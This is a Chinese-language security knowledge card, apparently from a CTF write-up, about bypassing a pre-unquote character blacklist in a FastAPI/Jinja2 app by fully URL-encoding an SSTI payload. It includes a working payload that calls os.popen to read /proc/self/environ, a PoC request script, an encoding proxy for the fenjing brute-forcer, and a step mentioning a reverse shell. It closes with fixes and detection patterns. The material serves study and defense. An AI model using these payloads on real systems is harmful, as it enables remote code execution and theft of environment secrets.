---
id: web-python-ssti-filter-before-unquote-full-urlencode
title: FastAPI/Jinja2 SSTI：字符黑名单在 unquote 前检查，全量 URL 编码绕过并执行 os.popen
type: scenario
domain: web
path: web/python/ssti
technique: ssti-filter-before-unquote-full-urlencode
aliases:
- Jinja2 SSTI 编码绕过
- unquote 解码绕过
- 全量 URL 编码 SSTI
- 先过滤后解码
- FastAPI SSTI
- fenjing 代理编码
tags:
- ssti
- jinja2
- fastapi
- unquote
- url-encoding
- waf-bypass
- blacklist
- python
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V152
  verified_at: '2026-11-06T07:36:03+08:00'
  notes: 已对照原文代码与 4 张图核对：/ssti 在 unquote 前逐字符检查黑名单、% 与 a-f/数字不在黑名单、全量 URL 编码还原 {{...}}、request.app.routes.__getitem__(4).endpoint.__globals__['os'].popen 读 /proc/self/environ、fenjing 本地编码代理均有原文/图03-04佐证。未验证点：未在靶机复跑；原文称黑名单含大多数小写字母但实际仅部分小写（不影响编码绕过结论）；CTF 题无组件版本，未设 versions；frontmatter 无 sources/source_url。
---

## 一句话结论

当接口先对原始 payload 逐字符做黑名单检查、随后才调用 `urllib.parse.unquote()` 再交给 Jinja2 `Template(...).render()` 时，把整个 payload 做全量 URL 编码即可：过滤器只看到 `%7b%7b...` 这类由 `%`、数字和 `a-f` 组成的串，`unquote` 却把它还原成 `{{...}}`，从而绕过对 `{`、`}`、`_`、`.`、字母等的封禁并执行 `os.popen`。

## 原理

- 过滤与解码顺序错误：代码在 `unquote(data.payload)` **之前**遍历 `data.payload`，黑名单包含 `{`、`}`、`_`、`.`、`/`、`'`、`"`、`[`、`]`、`+`、`*` 以及大多数小写/全部大写字母。
- 全量 URL 编码把每个字符变成 `%XX`：例如 `{` → `%7b`、`_` → `%5f`、`.` → `%2e`、`'` → `%27`。编码后的字符串只含 `%`、`0-9`、`a-f`（以及可能的大写十六进制 A-F），这些都不在黑名单里，因此逐字符检查全部通过。
- 随后 `unquote` 按 `%XX` 解码，还原出原始 Jinja2 模板；`Template(decoded_payload).render(request=request)` 在 Python 进程内求值，`{{ }}` 中的表达式可访问模板上下文与 Python 对象，最终到达 `os.popen(...).read()`。
- 为什么 `unquote` 不会二次转义：`unquote` 只负责百分号解码，不改变 `{{ }}` 的模板语义；解码后的字符串就是攻击者想要的模板源码。
- 原文 payload 通过 `request.app.routes.__getitem__(4).endpoint.__globals__['os']` 取到 `/ssti` 路由函数所在模块的全局 `os`，再 `popen('cat /proc/self/environ').read()`；也可以使用 `cycler.__init__.__globals__.os` 等常见 Jinja2 链。
- 过滤只作用于用户输入的“编码形态”，这是典型的“检查与使用对象不一致”（check-then-use）问题；只要解码发生在检查之后，任何基于字符的黑名单都可被编码绕过。

## 触发条件

- Web 应用把用户输入拼进 Jinja2 `Template` 并 `render`（SSTI）。
- 入口先做字符黑名单，再调用 `unquote`/URL 解码/HTML 解码等规范化函数。
- 黑名单未包含 `%` 与十六进制数字（或可通过大小写/双重编码绕过）。
- 模板上下文中可访问 `request`、`cycler`、`lipsum` 等对象，或能通过 `__globals__` 触达 `os`/`subprocess`。
- 需要先满足业务前置条件（如余额、登录），但这些通常可由其他逻辑漏洞或正常账号满足。

## 利用步骤

1. 确认过滤发生在解码前：提交 `%7b%7b7*7%7d%7d`，若返回 `49` 而不是被拦截，说明 `unquote` 在检查之后执行。
2. 构造明文 Jinja2 payload，例如 `{{request.app.routes.__getitem__(4).endpoint.__globals__['os'].popen('id').read()}}`。
3. 对整个 payload 逐字符做 URL 编码：`''.join(f'%{ord(c):02x}' for c in payload)`。
4. POST 到目标接口（JSON 字段 `payload`），确认返回命令输出；若被二次解码/过滤，尝试双重 URL 编码或只编码被禁字符。
5. 将命令换成读环境变量、列目录、读 flag；必要时用 `popen` 反弹 shell 或写文件。
6. 若目标是复杂过滤且手工构造困难，可在本地搭一个代理：代理接收明文 payload、在转发前做全量 URL 编码，再让 fenjing 等 SSTI 工具对代理爆破（工具看到的是明文，靶机收到的是编码串）。

## PoC

```python
import requests

payload = "{{request.app.routes.__getitem__(4).endpoint.__globals__['os'].popen('cat /proc/self/environ').read()}}"
encoded = "".join(f"%{ord(c):02x}" for c in payload)

r = requests.post(
    "http://target:8000/ssti",
    json={"payload": encoded},
    cookies={"session": "<登录后的 session>"},
)
print(r.text)
```

本地编码代理（配合 fenjing 等工具，工具输入明文、代理转发编码后的 payload）：

```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route("/test")
def proxy():
    plain = request.args.get("test", "")
    encoded = "".join(f"%{ord(c):02x}" for c in plain)
    r = requests.post(
        "http://target:8000/ssti",
        json={"payload": encoded},
        cookies={"session": "<session>"},
    )
    return r.text

app.run(port=8000)
```

## 变体与关联

- 变体：双重 URL 编码（`%257b`）绕过只解一次码的过滤器；或对 `+`、空格、Unicode 归一化做组合绕过。
- 变体：过滤器在解码后检查但只检查一次，可用 `%25` 让解码后仍是 `%xx`，再由模板/二次解码还原。
- 变体：其他“先过滤后解码”的 sink：XSS 的 HTML 实体解码、命令注入的 URL 解码、文件包含的路径解码；核心都是检查对象与实际使用对象不一致。
- 关联：[[web-python-ssti-jinja2-subclasses-index-rce]]（Jinja2 常规 RCE 链）；[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]（WAF 关键字绕过）；[[web-python-ssti-bottle-unicode-octal-walrus-bypass]]（另一种模板引擎编码绕过）。
- 关联：原文还利用转账逻辑（admin 转账不扣余额）和密码重置 hash 截断拿到高余额账号；这些是前置条件，不是本卡核心。

## 检测与防御

- 修复：先解码/规范化，再对解码后的最终字符串做检查；不要检查编码形态。
- 防御：Jinja2 使用 `SandboxedEnvironment`，禁止 `__globals__`、`__subclasses__`、`os`、`subprocess` 等属性；不要把 `request`、`app` 等敏感对象传入模板上下文。
- 防御：尽量不把用户输入当模板；需要动态模板时使用严格 allowlist 的变量替换，而不是 `Template(user_input).render()`。
- 检测：请求体中出现大量 `%xx` 且解码后包含 `{{`、`}}`、`__`、`__globals__`、`popen`、`subprocess` 等特征；同一会话短时间内提交大量编码 payload。
- 响应：排查模板渲染日志与进程命令历史，确认是否执行过系统命令；轮换 session 密钥与相关凭据。
